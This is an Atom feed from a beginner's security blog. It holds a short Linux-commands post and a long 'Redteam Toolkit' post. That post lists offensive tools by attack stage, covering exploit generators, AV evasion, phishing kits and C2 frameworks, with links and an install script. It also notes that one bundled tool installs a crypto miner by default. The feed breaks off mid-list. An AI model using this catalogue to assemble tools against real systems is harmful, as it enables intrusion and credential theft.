<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>信息安全初学者</title>
  
  <subtitle>No pains No gains！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://yaalonsong.github.io/"/>
  <updated>2019-04-07T22:56:40.980Z</updated>
  <id>https://yaalonsong.github.io/</id>
  
  <author>
    <name>yaron</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>linux 常用命令</title>
    <link href="https://yaalonsong.github.io/2019/04/08/Linux%20command.html"/>
    <id>https://yaalonsong.github.io/2019/04/08/Linux command.html</id>
    <published>2019-04-07T22:52:45.218Z</published>
    <updated>2019-04-07T22:56:40.980Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux-常用命令操作"><a href="#Linux-常用命令操作" class="headerlink" title="Linux 常用命令操作"></a>Linux 常用命令操作</h1><blockquote><p>温故而知新</p></blockquote><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kill -9 `ps -ef|grep apache2|grep -v grep|awk &apos;&#123;print $2&#125;&apos; `</span><br><span class="line">指定进程名执行 kill命令</span><br></pre></td></tr></table></figure><p><img src="/uploads/linux1.png" alt="1"></p><p><img src="/uploads/linux2.png" alt="2"></p><p><img src="/uploads/linux3.png" alt="3"></p><p><img src="/uploads/linux4.png" alt="4"></p><p><img src="/uploads/linux5.png" alt="5"></p><p><img src="/uploads/linux6.png" alt="6"></p><p><img src="/uploads/linux7.png" alt="7"></p><p><img src="/uploads/linux8.png" alt="8"></p><p><img src="/uploads/linux9.png" alt="9"></p><p><img src="/uploads/linux10.png" alt="10"></p><p><img src="/uploads/linux11.png" alt="11"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Linux-常用命令操作&quot;&gt;&lt;a href=&quot;#Linux-常用命令操作&quot; class=&quot;headerlink&quot; title=&quot;Linux 常用命令操作&quot;&gt;&lt;/a&gt;Linux 常用命令操作&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;温故而知新&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="linux" scheme="https://yaalonsong.github.io/categories/linux/"/>
    
    
      <category term="linux" scheme="https://yaalonsong.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Redteam Toolkit</title>
    <link href="https://yaalonsong.github.io/2019/04/07/Redteam%20Toolkit.html"/>
    <id>https://yaalonsong.github.io/2019/04/07/Redteam Toolkit.html</id>
    <published>2019-04-07T15:26:56.325Z</published>
    <updated>2020-03-17T17:06:24.094Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/uploads/bBQ9aKm.png" alt="alt text"></p><a id="more"></a><p>This tool kit is very much influenced by infosecn1nja’s kit.<br>Use this script to grab majority of the repos.</p><p><strong>NOTE: hard coded in /opt and made for Kali Linux</strong></p><p><strong>Total Size (so far): 2.5+Gb</strong></p><p>Install Guide:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/shr3ddersec/Shr3dKit.git</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">bash shr3dkit.sh</span><br></pre></td></tr></table></figure></p><p><strong>Change Log</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Fixed: macro_pack, LaZagne</span><br><span class="line">Code: Added all requirements to script, seperated pip requirements and merged to one file.</span><br><span class="line"></span><br><span class="line">Tools Added: Modlishka, pwndb, cat-sites, Phantom-Evasion</span><br></pre></td></tr></table></figure></p><p><strong>Phantom Evasion Forewarning</strong></p><p>Currently pursuing a permanent an IT Sec role, for personal budgeting I added this tool as does a fantastic job for AV Evasion without opening up your wallet. <em>Keep in mind, this does have crypto miner (xmr-stak) installer option. I kept the complete install out of script purposely for this reason</em>. To disable, please change <code>Miner=False</code> in Setup/Config.txt then run the script. You may always keep it on to help the devs, such as myself in my home lab.</p><h2 id="Contents"><a href="#Contents" class="headerlink" title="Contents"></a>Contents</h2><ul><li><a href="#reconnaissance">Reconnaissance</a></li><li><a href="#weaponization">Weaponization</a></li><li><a href="#delivery">Delivery</a></li><li><a href="#command-and-control">Command and Control</a></li><li><a href="#lateral-movement">Lateral Movement</a></li><li><a href="#establish-foothold">Establish Foothold</a></li><li><a href="#escalate-privileges">Escalate Privileges</a></li><li><a href="#data-exfiltration">Data Exfiltration</a></li><li><a href="#misc">Misc</a></li><li><a href="#references">References</a></li></ul><h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><h3 id="Active-Intelligence-Gathering"><a href="#Active-Intelligence-Gathering" class="headerlink" title="Active Intelligence Gathering"></a>Active Intelligence Gathering</h3><ul><li><strong>EyeWitness</strong> is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible. <a href="https://github.com/ChrisTruncer/EyeWitness" target="_blank" rel="noopener">https://github.com/ChrisTruncer/EyeWitness</a></li><li><strong>AWSBucketDump</strong> is a tool to quickly enumerate AWS S3 buckets to look for loot. <a href="https://github.com/jordanpotti/AWSBucketDump" target="_blank" rel="noopener">https://github.com/jordanpotti/AWSBucketDump</a></li><li><strong>AQUATONE</strong> is a set of tools for performing reconnaissance on domain names. <a href="https://github.com/michenriksen/aquatone" target="_blank" rel="noopener">https://github.com/michenriksen/aquatone</a></li><li><strong>spoofcheck</strong> a program that checks if a domain can be spoofed from. The program checks SPF and DMARC records for weak configurations that allow spoofing. <a href="https://github.com/BishopFox/spoofcheck" target="_blank" rel="noopener">https://github.com/BishopFox/spoofcheck</a></li><li><strong>Nmap</strong> is used to discover hosts and services on a computer network, thus building a “map” of the network. <a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">https://github.com/nmap/nmap</a></li><li><strong>dnsrecon</strong> a tool DNS Enumeration Script. <a href="https://github.com/darkoperator/dnsrecon" target="_blank" rel="noopener">https://github.com/darkoperator/dnsrecon</a></li></ul><h3 id="Passive-Intelligence-Gathering"><a href="#Passive-Intelligence-Gathering" class="headerlink" title="Passive Intelligence Gathering"></a>Passive Intelligence Gathering</h3><ul><li><strong>Social Mapper</strong> OSINT Social Media Mapping Tool, takes a list of names &amp; images (or LinkedIn company name) and performs automated target searching on a huge scale across multiple social media sites. Not restricted by APIs as it instruments a browser using Selenium. Outputs reports to aid in correlating targets across sites. <a href="https://github.com/SpiderLabs/social_mapper" target="_blank" rel="noopener">https://github.com/SpiderLabs/social_mapper</a></li><li><strong>skiptracer</strong> OSINT scraping framework, utilizes some basic python webscraping (BeautifulSoup) of PII paywall sites to compile passive information on a target on a ramen noodle budget. <a href="https://github.com/xillwillx/skiptracer" target="_blank" rel="noopener">https://github.com/xillwillx/skiptracer</a></li><li><strong>ScrapedIn</strong> a tool to scrape LinkedIn without API restrictions for data reconnaissance. <a href="https://github.com/dchrastil/ScrapedIn" target="_blank" rel="noopener">https://github.com/dchrastil/ScrapedIn</a></li><li><strong>linkScrape</strong> A LinkedIn user/company enumeration tool. <a href="https://github.com/NickSanzotta/linkScrape" target="_blank" rel="noopener">https://github.com/NickSanzotta/linkScrape</a></li><li><strong>FOCA</strong> (Fingerprinting Organizations with Collected Archives) is a tool used mainly to find metadata and hidden information in the documents its scans. <a href="https://github.com/ElevenPaths/FOCA" target="_blank" rel="noopener">https://github.com/ElevenPaths/FOCA</a></li><li><strong>theHarvester</strong> is a tool for gathering subdomain names, e-mail addresses, virtual<br>hosts, open ports/ banners, and employee names from different public sources. <a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a></li><li><strong>Metagoofil</strong> is a tool for extracting metadata of public documents (pdf,doc,xls,ppt,etc) availables in the target websites. <a href="https://github.com/laramies/metagoofil" target="_blank" rel="noopener">https://github.com/laramies/metagoofil</a></li><li><strong>SimplyEmail</strong> Email recon made fast and easy, with a framework to build on. <a href="https://github.com/killswitch-GUI/SimplyEmail" target="_blank" rel="noopener">https://github.com/killswitch-GUI/SimplyEmail</a></li><li><strong>truffleHog</strong> searches through git repositories for secrets, digging deep into commit history and branches.  <a href="https://github.com/dxa4481/truffleHog" target="_blank" rel="noopener">https://github.com/dxa4481/truffleHog</a></li><li><strong>Just-Metadata</strong> is a tool that gathers and analyzes metadata about IP addresses. It attempts to find relationships between systems within a large dataset. <a href="https://github.com/ChrisTruncer/Just-Metadata" target="_blank" rel="noopener">https://github.com/ChrisTruncer/Just-Metadata</a></li><li><strong>typofinder</strong> a finder of domain typos showing country of IP address. <a href="https://github.com/nccgroup/typofinder" target="_blank" rel="noopener">https://github.com/nccgroup/typofinder</a></li><li><strong>pwnedOrNot</strong> is a python script which checks if the email account has been compromised in a data breach, if the email account is compromised it proceeds to find passwords for the compromised account. <a href="https://github.com/thewhiteh4t/pwnedOrNot" target="_blank" rel="noopener">https://github.com/thewhiteh4t/pwnedOrNot</a></li><li><p><strong>GitHarvester</strong> This tool is used for harvesting information from GitHub like google dork. <a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a></p></li><li><p><strong>pwndb</strong> is a python command-line tool for searching leaked credentials using the Onion service with the same name. <a href="https://github.com/davidtavarez/pwndb/" target="_blank" rel="noopener">https://github.com/davidtavarez/pwndb/</a></p></li></ul><h3 id="Frameworks"><a href="#Frameworks" class="headerlink" title="Frameworks"></a>Frameworks</h3><ul><li><strong>Maltego</strong> is a unique platform developed to deliver a clear threat picture to the environment that an organization owns and operates. <a href="https://www.paterva.com/web7/downloads.php" target="_blank" rel="noopener">https://www.paterva.com/web7/downloads.php</a></li><li><strong>SpiderFoot</strong> the open source footprinting and intelligence-gathering tool. <a href="https://github.com/smicallef/spiderfoot" target="_blank" rel="noopener">https://github.com/smicallef/spiderfoot</a></li><li><strong>datasploit</strong> is an OSINT Framework to perform various recon techniques on Companies, People, Phone Number, Bitcoin Addresses, etc., aggregate all the raw data, and give data in multiple formats. <a href="https://github.com/DataSploit/datasploit" target="_blank" rel="noopener">https://github.com/DataSploit/datasploit</a></li><li><strong>Recon-ng</strong> is a full-featured Web Reconnaissance framework written in Python. <a href="https://bitbucket.org/LaNMaSteR53/recon-ng" target="_blank" rel="noopener">https://bitbucket.org/LaNMaSteR53/recon-ng</a></li></ul><h2 id="Weaponization"><a href="#Weaponization" class="headerlink" title="Weaponization"></a>Weaponization</h2><ul><li><strong>Composite Moniker</strong> Proof of Concept exploit for CVE-2017-8570. <a href="https://github.com/rxwx/CVE-2017-8570" target="_blank" rel="noopener">https://github.com/rxwx/CVE-2017-8570</a></li><li><strong>Exploit toolkit CVE-2017-8759</strong> is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft .NET Framework RCE. <a href="https://github.com/bhdresh/CVE-2017-8759" target="_blank" rel="noopener">https://github.com/bhdresh/CVE-2017-8759</a></li><li><strong>CVE-2017-11882 Exploit</strong> accepts over 17k bytes long command/code in maximum. <a href="https://github.com/unamer/CVE-2017-11882" target="_blank" rel="noopener">https://github.com/unamer/CVE-2017-11882</a></li><li><strong>Adobe Flash Exploit</strong> CVE-2018-4878. <a href="https://github.com/anbai-inc/CVE-2018-4878" target="_blank" rel="noopener">https://github.com/anbai-inc/CVE-2018-4878</a></li><li><strong>Exploit toolkit CVE-2017-0199</strong> is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft Office RCE. <a href="https://github.com/bhdresh/CVE-2017-0199" target="_blank" rel="noopener">https://github.com/bhdresh/CVE-2017-0199</a></li><li><strong>demiguise</strong> is a HTA encryption tool for RedTeams. <a href="https://github.com/nccgroup/demiguise" target="_blank" rel="noopener">https://github.com/nccgroup/demiguise</a></li><li><strong>Office-DDE-Payloads</strong> collection of scripts and templates to generate Office documents embedded with the DDE, macro-less command execution technique. <a href="https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads" target="_blank" rel="noopener">https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads</a></li><li><strong>CACTUSTORCH</strong> Payload Generation for Adversary Simulations. <a href="https://github.com/mdsecactivebreach/CACTUSTORCH" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/CACTUSTORCH</a></li><li><strong>SharpShooter</strong> is a payload creation framework for the retrieval and execution of arbitrary CSharp source code. <a href="https://github.com/mdsecactivebreach/SharpShooter" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/SharpShooter</a></li><li><strong>Don’t kill my cat</strong> is a tool that generates obfuscated shellcode that is stored inside of polyglot images. The image is 100% valid and also 100% valid shellcode. <a href="https://github.com/Mr-Un1k0d3r/DKMC" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/DKMC</a></li><li><strong>Malicious Macro Generator Utility</strong> Simple utility design to generate obfuscated macro that also include a AV / Sandboxes escape mechanism. <a href="https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator</a></li><li><strong>SCT Obfuscator</strong> Cobalt Strike SCT payload obfuscator. <a href="https://github.com/Mr-Un1k0d3r/SCT-obfuscator" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/SCT-obfuscator</a></li><li><strong>Invoke-Obfuscation</strong> PowerShell Obfuscator. <a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank" rel="noopener">https://github.com/danielbohannon/Invoke-Obfuscation</a></li><li><strong>Invoke-DOSfuscation</strong> cmd.exe Command Obfuscation Generator &amp; Detection Test Harness. <a href="https://github.com/danielbohannon/Invoke-DOSfuscation" target="_blank" rel="noopener">https://github.com/danielbohannon/Invoke-DOSfuscation</a></li><li><strong>morphHTA</strong> Morphing Cobalt Strike’s evil.HTA. <a href="https://github.com/vysec/morphHTA" target="_blank" rel="noopener">https://github.com/vysec/morphHTA</a></li><li><strong>Unicorn</strong> is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. <a href="https://github.com/trustedsec/unicorn" target="_blank" rel="noopener">https://github.com/trustedsec/unicorn</a></li><li><strong>Shellter</strong> is a dynamic shellcode injection tool, and the first truly dynamic PE infector ever created. <a href="https://www.shellterproject.com/" target="_blank" rel="noopener">https://www.shellterproject.com/</a></li><li><strong>EmbedInHTML</strong> Embed and hide any file in an HTML file. <a href="https://github.com/Arno0x/EmbedInHTML" target="_blank" rel="noopener">https://github.com/Arno0x/EmbedInHTML</a></li><li><strong>SigThief</strong> Stealing Signatures and Making One Invalid Signature at a Time. <a href="https://github.com/secretsquirrel/SigThief" target="_blank" rel="noopener">https://github.com/secretsquirrel/SigThief</a></li><li><strong>Veil</strong> is a tool designed to generate metasploit payloads that bypass common anti-virus solutions. <a href="https://github.com/Veil-Framework/Veil" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil</a></li><li><strong>CheckPlease</strong> Sandbox evasion modules written in PowerShell, Python, Go, Ruby, C, C#, Perl, and Rust. <a href="https://github.com/Arvanaghi/CheckPlease" target="_blank" rel="noopener">https://github.com/Arvanaghi/CheckPlease</a></li><li><strong>Invoke-PSImage</strong> is a tool to embeded a PowerShell script in the pixels of a PNG file and generates a oneliner to execute. <a href="https://github.com/peewpw/Invoke-PSImage" target="_blank" rel="noopener">https://github.com/peewpw/Invoke-PSImage</a></li><li><strong>LuckyStrike</strong> a PowerShell based utility for the creation of malicious Office macro documents. To be used for pentesting or educational purposes only. <a href="https://github.com/curi0usJack/luckystrike" target="_blank" rel="noopener">https://github.com/curi0usJack/luckystrike</a></li><li><strong>ClickOnceGenerator</strong> Quick Malicious ClickOnceGenerator for Red Team. The default application a simple WebBrowser widget that point to a website of your choice. <a href="https://github.com/Mr-Un1k0d3r/ClickOnceGenerator" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/ClickOnceGenerator</a></li><li><strong>macro_pack</strong> is a tool by @EmericNasi used to automatize obfuscation and generation of MS Office documents, VB scripts, and other formats for pentest, demo, and social engineering assessments. <a href="https://github.com/sevagas/macro_pack" target="_blank" rel="noopener">https://github.com/sevagas/macro_pack</a></li><li><strong>StarFighters</strong> a JavaScript and VBScript Based Empire Launcher. <a href="https://github.com/Cn33liz/StarFighters" target="_blank" rel="noopener">https://github.com/Cn33liz/StarFighters</a></li><li><strong>nps_payload</strong> this script will generate payloads for basic intrusion detection avoidance. It utilizes publicly demonstrated techniques from several different sources. <a href="https://github.com/trustedsec/nps_payload" target="_blank" rel="noopener">https://github.com/trustedsec/nps_payload</a></li><li><strong>SocialEngineeringPayloads</strong> a collection of social engineering tricks and payloads being used for credential theft and spear phishing attacks. <a href="https://github.com/bhdresh/SocialEngineeringPayloads" target="_blank" rel="noopener">https://github.com/bhdresh/SocialEngineeringPayloads</a></li><li><strong>The Social-Engineer Toolkit</strong> is an open-source penetration testing framework designed for social engineering. <a href="https://github.com/trustedsec/social-engineer-toolkit" target="_blank" rel="noopener">https://github.com/trustedsec/social-engineer-toolkit</a></li><li><strong>Phishery</strong> is a Simple SSL Enabled HTTP server with the primary purpose of phishing credentials via Basic Authentication.  <a href="https://github.com/ryhanson/phishery" target="_blank" rel="noopener">https://github.com/ryhanson/phishery</a></li><li><strong>PowerShdll</strong> run PowerShell with rundll32. Bypass software restrictions. <a href="https://github.com/p3nt4/PowerShdll" target="_blank" rel="noopener">https://github.com/p3nt4/PowerShdll</a></li><li><strong>Ultimate AppLocker ByPass List</strong> The goal of this repository is to document the most common techniques to bypass AppLocker. <a href="https://github.com/api0cradle/UltimateAppLockerByPassList" target="_blank" rel="noopener">https://github.com/api0cradle/UltimateAppLockerByPassList</a></li><li><strong>Ruler</strong> is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. <a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">https://github.com/sensepost/ruler</a></li><li><strong>Generate-Macro</strong> is a standalone PowerShell script that will generate a malicious Microsoft Office document with a specified payload and persistence method. <a href="https://github.com/enigma0x3/Generate-Macro" target="_blank" rel="noopener">https://github.com/enigma0x3/Generate-Macro</a></li><li><strong>Malicious Macro MSBuild Generator</strong> Generates Malicious Macro and Execute Powershell or Shellcode via MSBuild Application Whitelisting Bypass. <a href="https://github.com/infosecn1nja/MaliciousMacroMSBuild" target="_blank" rel="noopener">https://github.com/infosecn1nja/MaliciousMacroMSBuild</a></li><li><strong>Meta Twin</strong> is designed as a file resource cloner. Metadata, including digital signature, is extracted from one file and injected into another. <a href="https://github.com/threatexpress/metatwin" target="_blank" rel="noopener">https://github.com/threatexpress/metatwin</a></li><li><strong>WePWNise</strong> generates architecture independent VBA code to be used in Office documents or templates and automates bypassing application control and exploit mitigation software. <a href="https://github.com/mwrlabs/wePWNise" target="_blank" rel="noopener">https://github.com/mwrlabs/wePWNise</a></li><li><strong>DotNetToJScript</strong> a tool to create a JScript file which loads a .NET v2 assembly from memory. <a href="https://github.com/tyranid/DotNetToJScript" target="_blank" rel="noopener">https://github.com/tyranid/DotNetToJScript</a></li><li><strong>PSAmsi</strong> is a tool for auditing and defeating AMSI signatures. <a href="https://github.com/cobbr/PSAmsi" target="_blank" rel="noopener">https://github.com/cobbr/PSAmsi</a></li><li><strong>Reflective DLL injection</strong> is a library injection technique in which the concept of reflective programming is employed to perform the loading of a library from memory into a host process. <a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank" rel="noopener">https://github.com/stephenfewer/ReflectiveDLLInjection</a></li><li><strong>ps1encode</strong> use to generate and encode a powershell based metasploit payloads. <a href="https://github.com/CroweCybersecurity/ps1encode" target="_blank" rel="noopener">https://github.com/CroweCybersecurity/ps1encode</a></li><li><strong>Worse PDF</strong> turn a normal PDF file into malicious. Use to steal Net-NTLM Hashes from windows machines. <a href="https://github.com/3gstudent/Worse-PDF" target="_blank" rel="noopener">https://github.com/3gstudent/Worse-PDF</a></li><li><strong>SpookFlare</strong> has a different perspective to bypass security measures and it gives you the opportunity to bypass the endpoint countermeasures at the client-side detection and network-side detection. <a href="https://github.com/hlldz/SpookFlare" target="_blank" rel="noopener">https://github.com/hlldz/SpookFlare</a></li><li><strong>GreatSCT</strong> is an open source project to generate application white list bypasses. This tool is intended for BOTH red and blue team. <a href="https://github.com/GreatSCT/GreatSCT" target="_blank" rel="noopener">https://github.com/GreatSCT/GreatSCT</a></li><li><strong>nps</strong> running powershell without powershell. <a href="https://github.com/Ben0xA/nps" target="_blank" rel="noopener">https://github.com/Ben0xA/nps</a></li><li><strong>Meterpreter_Paranoid_Mode.sh</strong> allows users to secure your staged/stageless connection for Meterpreter by having it check the certificate of the handler it is connecting to. <a href="https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL" target="_blank" rel="noopener">https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL</a></li><li><strong>The Backdoor Factory (BDF)</strong> is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state. <a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory</a></li><li><strong>MacroShop</strong> a collection of scripts to aid in delivering payloads via Office Macros. <a href="https://github.com/khr0x40sh/MacroShop" target="_blank" rel="noopener">https://github.com/khr0x40sh/MacroShop</a></li><li><strong>UnmanagedPowerShell</strong> Executes PowerShell from an unmanaged process. <a href="https://github.com/leechristensen/UnmanagedPowerShell" target="_blank" rel="noopener">https://github.com/leechristensen/UnmanagedPowerShell</a></li><li><strong>evil-ssdp</strong> Spoof SSDP replies to phish for NTLM hashes on a network. Creates a fake UPNP device, tricking users into visiting a malicious phishing page. <a href="https://gitlab.com/initstring/evil-ssdp" target="_blank" rel="noopener">https://gitlab.com/initstring/evil-ssdp</a></li><li><strong>Ebowla</strong> Framework for Making Environmental Keyed Payloads. <a href="https://github.com/Genetic-Malware/Ebowla" target="_blank" rel="noopener">https://github.com/Genetic-Malware/Ebowla</a></li><li><strong>make-pdf-embedded</strong> a tool to create a PDF document with an embedded file. <a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/make-pdf-embedded.py" target="_blank" rel="noopener">https://github.com/DidierStevens/DidierStevensSuite/blob/master/make-pdf-embedded.py</a></li><li><strong>avet</strong> (AntiVirusEvasionTool) is targeting windows machines with executable files using different evasion techniques. <a href="https://github.com/govolution/avet" target="_blank" rel="noopener">https://github.com/govolution/avet</a></li><li><strong>Phantom-Evasion</strong> Interactive antivirus evasion tool written in python capable to generate (almost) FUD executable even with the most common 32 bit msfvenom payload (lower detection ratio with 64 bit payloads). <a href="https://github.com/oddcod3/Phantom-Evasion" target="_blank" rel="noopener">https://github.com/oddcod3/Phantom-Evasion</a> <strong>WARNING</strong>: Please be aware this does install a Minero miner by default. This can be changed in the <strong>Setup</strong> folder and edit <strong>Config.txt</strong> and edit <em>Mining = False</em>. If you want to support the project and developers, I would recommend keeping on. </li></ul><h2 id="Delivery"><a href="#Delivery" class="headerlink" title="Delivery"></a>Delivery</h2><h3 id="Phishing"><a href="#Phishing" class="headerlink" title="Phishing"></a>Phishing</h3><ul><li><strong>King Phisher</strong> is a tool for testing and promoting user awareness by simulating real world phishing attacks. <a href="https://github.com/securestate/king-phisher" target="_blank" rel="noopener">https://github.com/securestate/king-phisher</a></li><li><strong>FiercePhish</strong> is a full-fledged phishing framework to manage all phishing engagements. It allows you to track separate phishing campaigns, schedule sending of emails, and much more. <a href="https://github.com/Raikia/FiercePhish" target="_blank" rel="noopener">https://github.com/Raikia/FiercePhish</a></li><li><strong>ReelPhish</strong> is a Real-Time Two-Factor Phishing Tool. <a href="https://github.com/fireeye/ReelPhish/" target="_blank" rel="noopener">https://github.com/fireeye/ReelPhish/</a></li><li><strong>Gophish</strong> is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily setup and execute phishing engagements and security awareness training. <a href="https://github.com/gophish/gophish" target="_blank" rel="noopener">https://github.com/gophish/gophish</a></li><li><strong>CredSniper</strong> is a phishing framework written with the Python micro-framework Flask and Jinja2 templating which supports capturing 2FA tokens. <a href="https://github.com/ustayready/CredSniper" target="_blank" rel="noopener">https://github.com/ustayready/CredSniper</a></li><li><strong>PwnAuth</strong> a web application framework for launching and managing OAuth abuse campaigns. <a href="https://github.com/fireeye/PwnAuth" target="_blank" rel="noopener">https://github.com/fireeye/PwnAuth</a></li><li><strong>Phishing Frenzy</strong> Ruby on Rails Phishing Framework. <a href="https://github.com/pentestgeek/phishing-frenzy" target="_blank" rel="noopener">https://github.com/pentestgeek/phishing-frenzy</a></li><li><strong>Phishing Pretexts</strong> a library of pretexts to use on offensive phishing engagements. <a href="https://github.com/L4bF0x/PhishingPretexts" target="_blank" rel="noopener">https://github.com/L4bF0x/PhishingPretexts</a></li><li><strong>Modlishka</strong> is a flexible and powerful reverse proxy, that will take your ethical phishing campaigns to the next level. <a href="https://github.com/drk1wi/Modlishka" target="_blank" rel="noopener">https://github.com/drk1wi/Modlishka</a></li></ul><h3 id="Watering-Hole-Attack"><a href="#Watering-Hole-Attack" class="headerlink" title="Watering Hole Attack"></a>Watering Hole Attack</h3><ul><li><strong>BeEF</strong> is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser. <a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a></li></ul><h2 id="Command-and-Control"><a href="#Command-and-Control" class="headerlink" title="Command and Control"></a>Command and Control</h2><h3 id="Remote-Access-Tools"><a href="#Remote-Access-Tools" class="headerlink" title="Remote Access Tools"></a>Remote Access Tools</h3><ul><li><strong>Cobalt Strike</strong> is software for Adversary Simulations and Red Team Operations. <a href="https://cobaltstrike.com/" target="_blank" rel="noopener">https://cobaltstrike.com/</a></li><li><strong>Empire</strong> is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent. <a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a></li><li><strong>Metasploit Framework</strong> is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. <a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></li><li><strong>SILENTTRINITY</strong> A post-exploitation agent powered by Python, IronPython, C#/.NET. <a href="https://github.com/byt3bl33d3r/SILENTTRINITY" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/SILENTTRINITY</a></li><li><strong>Pupy</strong> is an opensource, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool mainly written in python. <a href="https://github.com/n1nj4sec/pupy" target="_blank" rel="noopener">https://github.com/n1nj4sec/pupy</a></li><li><strong>Koadic</strong> or COM Command &amp; Control, is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire. <a href="https://github.com/zerosum0x0/koadic" target="_blank" rel="noopener">https://github.com/zerosum0x0/koadic</a></li><li><strong>PoshC2</strong> is a proxy aware C2 framework written completely in PowerShell to aid penetration testers with red teaming, post-exploitation and lateral movement. <a href="https://github.com/nettitude/PoshC2" target="_blank" rel="noopener">https://github.com/nettitude/PoshC2</a></li><li><strong>Gcat</strong> a stealthy Python based backdoor that uses Gmail as a command and control server. <a href="https://github.com/byt3bl33d3r/gcat" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/gcat</a></li><li><strong>TrevorC2</strong> is a legitimate website (browsable) that tunnels client/server communications for covert command execution. <a href="https://github.com/trustedsec/trevorc2" target="_blank" rel="noopener">https://github.com/trustedsec/trevorc2</a></li><li><strong>Merlin</strong> is a cross-platform post-exploitation HTTP/2 Command &amp; Control server and agent written in golang. <a href="https://github.com/Ne0nd0g/merlin" target="_blank" rel="noopener">https://github.com/Ne0nd0g/merlin</a></li><li><strong>Quasar</strong> is a fast and light-weight remote administration tool coded in C#. Providing high stability and an easy-to-use user interface, Quasar is the perfect remote administration solution for you. <a href="https://github.com/quasar/QuasarRAT" target="_blank" rel="noopener">https://github.com/quasar/QuasarRAT</a></li></ul><h3 id="Staging"><a href="#Staging" class="headerlink" title="Staging"></a>Staging</h3><ul><li><strong>Rapid Attack Infrastructure (RAI)</strong> Red Team Infrastructure… Quick… Fast… Simplified<br>One of the most tedious phases of a Red Team Operation is usually the infrastructure setup. This usually entails<br>a teamserver or controller, domains, redirectors, and a Phishing server. <a href="https://github.com/obscuritylabs/RAI" target="_blank" rel="noopener">https://github.com/obscuritylabs/RAI</a></li><li><strong>Red Baron</strong> is a set of modules and custom/third-party providers for Terraform which tries to automate creating resilient, disposable, secure and agile infrastructure for Red Teams. <a href="https://github.com/byt3bl33d3r/Red-Baron" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/Red-Baron</a></li><li><strong>EvilURL</strong> generate unicode evil domains for IDN Homograph Attack and detect them. <a href="https://github.com/UndeadSec/EvilURL" target="_blank" rel="noopener">https://github.com/UndeadSec/EvilURL</a></li><li><strong>Domain Hunter</strong> checks expired domains, bluecoat categorization, and Archive.org history to determine good candidates for phishing and C2 domain names. <a href="https://github.com/threatexpress/domainhunter" target="_blank" rel="noopener">https://github.com/threatexpress/domainhunter</a></li><li><strong>PowerDNS</strong> is a simple proof of concept to demonstrate the execution of PowerShell script using DNS only. <a href="https://github.com/mdsecactivebreach/PowerDNS" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/PowerDNS</a></li><li><strong>Chameleon</strong> a tool for evading Proxy categorisation. <a href="https://github.com/mdsecactivebreach/Chameleon" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/Chameleon</a></li><li><strong>CatMyFish</strong> Search for categorized domain that can be used during red teaming engagement. Perfect to setup whitelisted domain for your Cobalt Strike 